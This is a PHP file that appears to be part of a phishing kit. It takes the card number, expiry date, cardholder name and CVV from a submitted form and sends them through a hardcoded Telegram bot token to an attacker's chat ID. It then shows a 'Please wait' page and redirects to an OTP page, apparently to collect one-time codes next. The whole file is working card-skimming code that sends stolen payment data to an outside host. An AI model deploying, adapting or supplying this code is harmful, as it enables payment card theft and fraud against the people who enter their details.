<?php
 $token="5912247911:AAF5D53I7Q89_juB6I-Je9jJMoC5ENYgKD0";

//getting input from post method 
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the form values
    $cardnumber = $_POST['cardNumber'] ?? '';
    $Month = $_POST['month'] ?? '';
    $holdername = $_POST['cardholder'] ?? '';
    $cvv = $_POST['cvv'] ?? '';
};

/////macinize

$message = "Cardholdername: $holdername\nCardNumber: $cardnumber\nExpire date: $Month\nCvv: $cvv " ;
$data = [
 'text' => $message,
 'chat_id' => '1352942997'
];

$hmm = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?" .http_build_query($data));


header( "refresh:7;URL=/otp.php" );

?>

<!DOCTYPE html>
<html>
<body>
<h1>Please wait </h1>


<button onclick="myFunction()"></button>

<script>
function myFunction() {
  document.body.style.background = "#f3f3f3 url('https://cdn.dribbble.com/users/2973561/screenshots/5757826/loading__.gif') no-repeat right top";
}
</script>

</body>
</html>
